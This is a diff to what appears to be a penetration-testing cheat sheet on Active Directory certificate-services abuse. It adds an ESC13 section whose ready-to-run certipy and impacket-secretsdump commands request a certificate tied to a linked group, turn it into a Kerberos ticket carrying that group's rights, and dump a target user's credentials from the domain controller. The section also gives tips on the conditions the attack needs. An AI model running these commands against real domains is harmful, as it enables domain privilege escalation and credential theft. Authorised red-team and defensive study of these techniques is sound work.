@@ -36,6 +36,20 @@ certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
 - Use your own SID in `-write-default-configuration`, not a broad default principal.
 - Re-enumerate afterwards; don't overwrite concurrent edits.
 
+## ESC13 (issuance policy linked to a group)
+`find` shows `ESC13` / `Linked Groups` on a template you can enroll in, with client auth EKU.
+```bash
+certipy find -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> -oids -stdout
+certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
+  -target <CA-FQDN> -ca <CA-NAME> -template <TEMPLATE>
+certipy auth -pfx <USER>.pfx -dc-ip <DC-IP>
+export KRB5CCNAME=<USER>.ccache
+impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -target-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN.TLD>/<USER>@<DC-FQDN>'
+```
+- The group SID lives only in the TGT (ccache): the NT hash `auth` prints is your own and carries no extra rights.
+- Check what the linked group can do first (BloodHound / [object-rights](object-rights.md)); `secretsdump` only works if it has DCSync.
+- No SAN needed: you stay yourself, plus the linked group.
+
 ## ESC8
 Live relay to the enrollment endpoint → [ntlm-relay](ntlm-relay.md#ad-cs-relay-esc8). A captured NetNTLM file is not enough.
 
